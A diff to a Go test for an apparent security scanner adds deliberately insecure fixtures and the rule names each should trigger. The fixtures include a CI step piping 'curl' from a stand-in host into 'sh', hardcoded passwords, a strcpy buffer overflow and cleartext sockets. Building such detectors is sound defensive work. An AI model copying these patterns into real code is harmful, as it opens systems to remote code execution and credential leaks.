@@ -21,13 +21,22 @@ func TestGoldenPositives(t *testing.T) {
 			"  return parseInt(req.q)\n"+
 			"}\n") +
 		extraDiff("Dockerfile", "FROM alpine:latest\nADD https://x.test/a.tgz /a\nUSER root\n") +
-		extraDiff("main.tf", "resource \"aws_s3_bucket\" \"b\" {\n  acl = \"public-read\"\n}\n")
+		extraDiff("main.tf", "resource \"aws_s3_bucket\" \"b\" {\n  acl = \"public-read\"\n  password = \"Sup3rSecretValue\"\n}\n") +
+		extraDiff(".github/workflows/ci.yml", "on: pull_request_target\njobs:\n  x:\n    steps:\n      - run: curl -k https://x.test/i.sh | sh\n") +
+		extraDiff(".netrc", "machine example.com login deploy password hunter2abc\n") +
+		extraDiff("sec.yaml", "apiVersion: v1\nkind: Secret\ndata:\n  pw: eA==\n") +
+		extraDiff("srv.go", "package main\nimport \"net\"\nfunc f() {\n\tnet.Listen(\"tcp\", \":8080\")\n}\n") +
+		extraDiff("u.c", "#include <stdio.h>\nvoid f(char *p) {\n    char b[8];\n    strcpy(b, p);\n}\n") +
+		extraDiff("w.js", "const ws = new WebSocket(\"ws://x.test/s\")\n")
 
 	want := []string{
 		"missing-timeout", "archive-extraction", "jwt-misuse",
 		"ssrf", "web-storage-secrets", "postmessage-origin",
 		"js-common-mistakes", "dockerfile-remote-add", "dockerfile-user",
-		"unpinned-image", "iac-exposure",
+		"unpinned-image", "iac-exposure", "terraform-secret",
+		"pull-request-target", "pipe-to-shell", "secret-material",
+		"k8s-committed-secret", "bind-all-interfaces",
+		"unsafe-c-functions", "cleartext-websocket",
 	}
 	fired := map[string]bool{}
 	for _, r := range ExtraRules("/tmp/nonexistent-root") {
